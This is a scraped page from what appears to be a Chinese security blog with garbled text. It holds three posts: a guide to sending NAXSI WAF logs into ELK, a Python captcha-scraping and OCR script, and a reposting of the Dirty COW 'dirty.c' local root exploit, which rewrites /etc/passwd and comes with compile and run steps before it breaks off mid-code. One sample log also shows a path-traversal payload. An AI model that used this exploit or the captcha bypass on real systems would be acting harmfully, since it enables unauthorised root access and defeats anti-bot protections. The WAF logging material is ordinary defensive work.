		patterns_dir &#x3D;&gt; &quot;&#x2F;opt&#x2F;logstash-5.5.1&#x2F;pattern&quot;
		match &#x3D;&gt; [ &quot;message&quot; , &quot;%&#123;NAXSI4&#125;&quot;,
			   &quot;message&quot; , &quot;%&#123;NAXSI3&#125;&quot;,
			   &quot;message&quot; , &quot;%&#123;FMT_R&#125;&quot;
			]
  	     &#125;
	ruby &#123;
	code &#x3D;&gt; &quot;require &#39;digest&#x2F;md5&#39;;
	event.set(&#39;computed_id&#39;, Digest::MD5.hexdigest(event.get(&#39;request_id&#39;)+event.get(&#39;time&#39;)) + &#39;_&#39; + event.get(&#39;logtype&#39;))&quot;
	    &#125;

&#125;
&#125;
output&#123;
      if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
	elasticsearch &#123;
	   hosts &#x3D;&gt; [&quot;localhost&quot;]
	   index &#x3D;&gt; &quot;nxapi&quot;
           document_id &#x3D;&gt; &quot;%&#123;computed_id&#125;&quot;
	&#125;
	stdout &#123; codec &#x3D;&gt; rubydebug&#125;
     &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/10/25/naxsi-elk.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>NAXSIé˜²ç«å¢™ä»‹ç»: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi">https://github.com/nbs-system/naxsi</a><br>é…ç½®å®‰è£…: <a target="_blank" rel="noopener" href="https://klionsec.github.io/2017/09/18/naxsiwaf/">https://klionsec.github.io/2017/09/18/naxsiwaf/</a><br>ä¸»è¦åŠŸèƒ½ï¼š</p>
<p>è¿‡æ»¤XSSï¼ŒSQLæ³¨å…¥ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶éå†</p>
<p>NAXSIæ‹¦æˆªæ”»å‡»ä¹‹åï¼Œä¼šäº§ç”Ÿå¯¹åº”çš„æ—¥å¿—ã€‚ç±»ä¼¼æ ¼å¼æ˜¯è¿™æ ·çš„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_EXLOG: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;id&#x3D;1200&amp;zone&#x3D;BODY&amp;var_name&#x3D;passwd&amp;content&#x3D;admin..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;
2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_FMT: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;learning&#x3D;0&amp;vers&#x3D;0.55.3&amp;total_processed&#x3D;4&amp;total_blocked&#x3D;4&amp;block&#x3D;1&amp;cscore0&#x3D;$TRAVERSAL&amp;score0&#x3D;12&amp;zone0&#x3D;BODY&amp;id0&#x3D;1200&amp;var_name0&#x3D;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è¿™é‡Œæˆ‘æ‰“å¼€äº†naxsiçš„EXLOGå¼€å…³ï¼Œè¿™æ ·å½“æ”¶é›†åˆ°æ”»å‡»çš„æ—¥å¿—ï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„è¯·æ±‚å†…å®¹: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi/wiki/naxsilogs">https://github.com/nbs-system/naxsi/wiki/naxsilogs</a><br>ç°åœ¨çš„ç›®æ ‡æ˜¯å¦‚ä½•æŠŠä¸Šé¢çš„æ—¥å¿—æ‰‹æ”¶é›†åˆ°elké‡Œé¢æ–¹ä¾¿å›¾å½¢åŒ–æŸ¥çœ‹ï¼Œä»¥ä¸‹æ“ä½œï¼Œå…ˆåœ¨logstashé‡Œé¢æ–°å»ºæ–‡ä»¶å¤¹ï¼Œå†™è‡ªå·±çš„æ­£åˆ™ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">logstash&gt; mkdir pattern
logstash&gt; cd pattern
logstash&gt; vim naxsi
DA1 \d&#123;4&#125;&#x2F;\d&#123;2&#125;&#x2F;\d&#123;2&#125;
TM1 \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;
LEVEL (\w+)
NUM1 \d+(?:#0: \*)
NUM2 \d+
EXLOG NAXSI_EXLOG
FMT NAXSI_FMT
ID1 (\d+)
ZONE \w+
VAR1  (.*)
CONTENT (.*)
T3 \w+
T4 HTTP&#x2F;1\.1&quot;, host: &quot;(.*)&quot;, referrer: &quot;
HOST (.*)
NAXSI %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
NAXSI2 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
NAXSI3 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;
NAXSI4 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
FMT %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;&amp;score0&#x3D;%&#123;HOST:score0&#125;&amp;cscore1&#x3D;%&#123;HOST:xss&#125;&amp;score1&#x3D;%&#123;HOST:score&#125;&amp;zone0&#x3D;%&#123;WORD:args&#125;&amp;id0&#x3D;%&#123;NUMBER:id&#125;&amp;var_name0&#x3D;%&#123;HOST:varname&#125;,\sclient:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
FMT_R %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;,\sclient:\s(.*)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢è¿™ä¸€å¨ç¿”å°±æ˜¯è§£ææœ€ä¸Šé¢æ—¥å¿—çš„æ­£åˆ™ï¼Œå…¶ä¸­ç”¨åˆ°çš„æ˜¯NAXSI3,NAXSI4,FMT_R,å…¶ä»–æ˜¯è°ƒè¯•ç”¨çš„ã€‚ç„¶åçµ¦logstashæ·»åŠ plugin:</p>
<pre class="line-numbers language-none"><code class="language-none">bin&#x2F;logstash-plugin install logstash-filter-grok
bin&#x2F;logstash-plugin install logstash-filter-ruby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


<p>ç„¶åé…ç½®<code>/etc/logstash.conf</code>æ–‡ä»¶ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">input&#123;
     file &#123;
       path &#x3D;&gt; &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;naxsi.err&quot;
       type &#x3D;&gt; &quot;naxsi-error&quot;
       start_position &#x3D;&gt; &quot;beginning&quot;
   			&#125;
&#125;
filter&#123;
     if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
	grok &#123;
		patterns_dir &#x3D;&gt; &quot;&#x2F;opt&#x2F;logstash-5.5.1&#x2F;pattern&quot;
		match &#x3D;&gt; [ &quot;message&quot; , &quot;%&#123;NAXSI4&#125;&quot;,
			   &quot;message&quot; , &quot;%&#123;NAXSI3&#125;&quot;,
			   &quot;message&quot; , &quot;%&#123;FMT_R&#125;&quot;
			]
  	     &#125;
	ruby &#123;
	code &#x3D;&gt; &quot;require &#39;digest&#x2F;md5&#39;;
	event.set(&#39;computed_id&#39;, Digest::MD5.hexdigest(event.get(&#39;request_id&#39;)+event.get(&#39;time&#39;)) + &#39;_&#39; + event.get(&#39;logtype&#39;))&quot;
	    &#125;

&#125;
&#125;
output&#123;
      if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
	elasticsearch &#123;
	   hosts &#x3D;&gt; [&quot;localhost&quot;]
	   index &#x3D;&gt; &quot;nxapi&quot;
           document_id &#x3D;&gt; &quot;%&#123;computed_id&#125;&quot;
	&#125;
	stdout &#123; codec &#x3D;&gt; rubydebug&#125;
     &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/10/25/naxsi-elk.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/09/26/VerifyCode.html" >éªŒè¯ç è¯†åˆ«</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-09-26  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>å…ˆç°åº¦å¤„ç†</p>
<pre class="line-numbers language-none"><code class="language-none">img &#x3D; Image.open(&#39;1317.png&#39;) # æ‰“å¼€å›¾ç‰‡
img &#x3D; img.convert(&#39;L&#39;) # è½¬æ¢æˆç°åº¦å›¾ç‰‡
img.save(&#39;1317-L.png&#39;) # ä¿å­˜å›¾ç‰‡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åæ˜¯äºŒå€¼åŒ–, äºŒå€¼åŒ–å¤„ç†ä¹‹åï¼ŒæŠ•å½±</p>
<p>ä»¥é¢„å‘å¸ƒä¸ºä¾‹å­ï¼Œè·å–éªŒè¯çš„url: <a target="_blank" rel="noopener" href="https://wxxx.net/api/h5/getVerifyCode">https://wxxx.net/api/h5/getVerifyCode</a><br>å¾—åˆ°çš„éªŒè¯ç æ˜¯base64ç¼–ç ï¼Œä½¿ç”¨pythonè§£ç ä¹‹åä¿å­˜å³å¯:</p>
<pre class="line-numbers language-none"><code class="language-none">import requests
url &#x3D; &quot;https:&#x2F;&#x2F;xxxxx&#x2F;getVerifyCode&quot;

for i in range(20):
	imgfile &#x3D; str(i) + &#39;.jpg&#39;
	req &#x3D; requests.get(url)
	image_data &#x3D; req.json()[&quot;result&quot;][&quot;imageEncode&quot;]
	fh &#x3D; open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + imgfile, &quot;wb&quot;)
	fh.write(image_data.decode(&#39;base64&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢çš„ä»£ç å¯ä»¥è·å–20ä¸ªéªŒè¯ç ï¼Œ<br>ç„¶åå¤„ç†éªŒè¯ç ï¼š</p>
<p>å…ˆç°åº¦å¤„ç†â€“&gt; äºŒå€¼åŒ– â€“&gt; æŠ•å½±æˆ–è€…ä½¿ç”¨8é‚»åŸŸç®—æ³•</p>
<p>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨8é‚»åŸŸç®—æ³•ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
from PIL import Image
import os
import re
import pytesseract

def binarizing(img, threshold):
   img &#x3D; img.convert(&quot;L&quot;)
   pixdata &#x3D; img.load()
   w, h &#x3D; img.size
   for y in range(h):
      for x in range(w):
         if pixdata[x, y] &lt; threshold:
            pixdata[x, y] &#x3D; 0
         else:
            pixdata[x, y] &#x3D; 255
   return img
   # img.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;43.jpg&quot;)


def depoint(img):
   pixdata &#x3D; img.load()
   w,h &#x3D; img.size
   for y in range(1,h-1):
      for x in range(1, w-1):
         count &#x3D; 0
         if pixdata[x, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x, y+1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y+1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y+1] &gt; 245:
            count &#x3D; count + 1
         if count &gt; 4:
            pixdata[x, y] &#x3D; 255
   return img

path &#x3D; &quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&quot;
pattern &#x3D; re.compile(r&quot;[a-zA-Z0-9]&quot;)
images &#x3D; os.listdir(path)
for image in images:
   if image.split(&quot;.&quot;)[1] &#x3D;&#x3D; &quot;jpg&quot;:
      img &#x3D; Image.open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + image)
      b_img &#x3D; binarizing(img, 230)
      v &#x3D; depoint(b_img)
      vcode &#x3D; pytesseract.image_to_string(v)
      matches &#x3D; re.findall(pattern, vcode)
      filename &#x3D; &#39;&#39;.join(map(str, matches))
      v.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;train&#x2F;&quot; + filename + &#39;.jpg&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><a target="_blank" rel="noopener" href="http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/">http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</a></p>
	

	</div>
  <a type="button" href="/2017/09/26/VerifyCode.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>å…ˆç°åº¦å¤„ç†</p>
<pre class="line-numbers language-none"><code class="language-none">img &#x3D; Image.open(&#39;1317.png&#39;) # æ‰“å¼€å›¾ç‰‡
img &#x3D; img.convert(&#39;L&#39;) # è½¬æ¢æˆç°åº¦å›¾ç‰‡
img.save(&#39;1317-L.png&#39;) # ä¿å­˜å›¾ç‰‡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åæ˜¯äºŒå€¼åŒ–, äºŒå€¼åŒ–å¤„ç†ä¹‹åï¼ŒæŠ•å½±</p>
<p>ä»¥é¢„å‘å¸ƒä¸ºä¾‹å­ï¼Œè·å–éªŒè¯çš„url: <a target="_blank" rel="noopener" href="https://wxxx.net/api/h5/getVerifyCode">https://wxxx.net/api/h5/getVerifyCode</a><br>å¾—åˆ°çš„éªŒè¯ç æ˜¯base64ç¼–ç ï¼Œä½¿ç”¨pythonè§£ç ä¹‹åä¿å­˜å³å¯:</p>
<pre class="line-numbers language-none"><code class="language-none">import requests
url &#x3D; &quot;https:&#x2F;&#x2F;xxxxx&#x2F;getVerifyCode&quot;

for i in range(20):
	imgfile &#x3D; str(i) + &#39;.jpg&#39;
	req &#x3D; requests.get(url)
	image_data &#x3D; req.json()[&quot;result&quot;][&quot;imageEncode&quot;]
	fh &#x3D; open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + imgfile, &quot;wb&quot;)
	fh.write(image_data.decode(&#39;base64&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢çš„ä»£ç å¯ä»¥è·å–20ä¸ªéªŒè¯ç ï¼Œ<br>ç„¶åå¤„ç†éªŒè¯ç ï¼š</p>
<p>å…ˆç°åº¦å¤„ç†â€“&gt; äºŒå€¼åŒ– â€“&gt; æŠ•å½±æˆ–è€…ä½¿ç”¨8é‚»åŸŸç®—æ³•</p>
<p>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨8é‚»åŸŸç®—æ³•ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
from PIL import Image
import os
import re
import pytesseract

def binarizing(img, threshold):
   img &#x3D; img.convert(&quot;L&quot;)
   pixdata &#x3D; img.load()
   w, h &#x3D; img.size
   for y in range(h):
      for x in range(w):
         if pixdata[x, y] &lt; threshold:
            pixdata[x, y] &#x3D; 0
         else:
            pixdata[x, y] &#x3D; 255
   return img
   # img.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;43.jpg&quot;)


def depoint(img):
   pixdata &#x3D; img.load()
   w,h &#x3D; img.size
   for y in range(1,h-1):
      for x in range(1, w-1):
         count &#x3D; 0
         if pixdata[x, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x, y+1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y+1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y+1] &gt; 245:
            count &#x3D; count + 1
         if count &gt; 4:
            pixdata[x, y] &#x3D; 255
   return img

path &#x3D; &quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&quot;
pattern &#x3D; re.compile(r&quot;[a-zA-Z0-9]&quot;)
images &#x3D; os.listdir(path)
for image in images:
   if image.split(&quot;.&quot;)[1] &#x3D;&#x3D; &quot;jpg&quot;:
      img &#x3D; Image.open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + image)
      b_img &#x3D; binarizing(img, 230)
      v &#x3D; depoint(b_img)
      vcode &#x3D; pytesseract.image_to_string(v)
      matches &#x3D; re.findall(pattern, vcode)
      filename &#x3D; &#39;&#39;.join(map(str, matches))
      v.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;train&#x2F;&quot; + filename + &#39;.jpg&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><a target="_blank" rel="noopener" href="http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/">http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</a></p>
	
	</div>
  <a type="button" href="/2017/09/26/VerifyCode.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/09/12/c0w.html" >C0w</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-09-12  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p>
<pre class="line-numbers language-none"><code class="language-none">Compile with:
&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
&#x2F;&#x2F;
&#x2F;&#x2F; Then run the newly create binary by either doing:
&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;
&#x2F;&#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability
&#x2F;&#x2F; as a base and automatically generates a new passwd line.
&#x2F;&#x2F; The user will be prompted for the new password when the binary is run.
&#x2F;&#x2F; The original &#x2F;etc&#x2F;passwd file is then backed up to &#x2F;tmp&#x2F;passwd.bak
&#x2F;&#x2F; and overwrites the root account with the generated line.
&#x2F;&#x2F; After running the exploit you should be able to login with the newly
&#x2F;&#x2F; created user.
&#x2F;&#x2F;
&#x2F;&#x2F; To use this exploit modify the user values according to your needs.
&#x2F;&#x2F;   The default is &quot;firefart&quot;.
&#x2F;&#x2F;
&#x2F;&#x2F; Original exploit (dirtycow&#39;s ptrace_pokedata &quot;pokemon&quot; method):
&#x2F;&#x2F;   https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;pokemon.c
&#x2F;&#x2F;
&#x2F;&#x2F; Compile with:
&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
&#x2F;&#x2F;
&#x2F;&#x2F; Then run the newly create binary by either doing:
&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
&#x2F;&#x2F;
&#x2F;&#x2F; Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer
&#x2F;&#x2F; https:&#x2F;&#x2F;firefart.at
&#x2F;&#x2F;

#include &lt;fcntl.h&gt;
#include &lt;pthread.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys&#x2F;mman.h&gt;
#include &lt;sys&#x2F;types.h&gt;
#include &lt;sys&#x2F;stat.h&gt;
#include &lt;sys&#x2F;wait.h&gt;
#include &lt;sys&#x2F;ptrace.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;crypt.h&gt;

const char *filename &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;
const char *backup_filename &#x3D; &quot;&#x2F;tmp&#x2F;passwd.bak&quot;;
const char *salt &#x3D; &quot;firefart&quot;;

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo &#123;
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
&#125;;

char *generate_password_hash(char *plaintext_pw) &#123;
  return crypt(plaintext_pw, salt);
&#125;

char *generate_passwd_line(struct Userinfo u) &#123;
  const char *format &#x3D; &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;
  int size &#x3D; snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret &#x3D; malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
&#125;

void *madviseThread(void *arg) &#123;
  int i, c &#x3D; 0;
  for(i &#x3D; 0; i &lt; 200000000; i++) &#123;
    c +&#x3D; madvise(map, 100, MADV_DONTNEED);
  &#125;
  printf(&quot;madvise %d\n\n&quot;, c);
&#125;

int copy_file(const char *from, const char *to) &#123;
  &#x2F;&#x2F; check if target file already exists
  if(access(to, F_OK) !&#x3D; -1) &#123;
    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,
      to);
    return -1;
  &#125;

  char ch;
  FILE *source, *target;

  source &#x3D; fopen(from, &quot;r&quot;);
  if(source &#x3D;&#x3D; NULL) &#123;
    return -1;
  &#125;
  target &#x3D; fopen(to, &quot;w&quot;);
  if(target &#x3D;&#x3D; NULL) &#123;
     fclose(source);
     return -1;
  &#125;

  while((ch &#x3D; fgetc(source)) !&#x3D; EOF) &#123;
     fputc(ch, target);
   &#125;

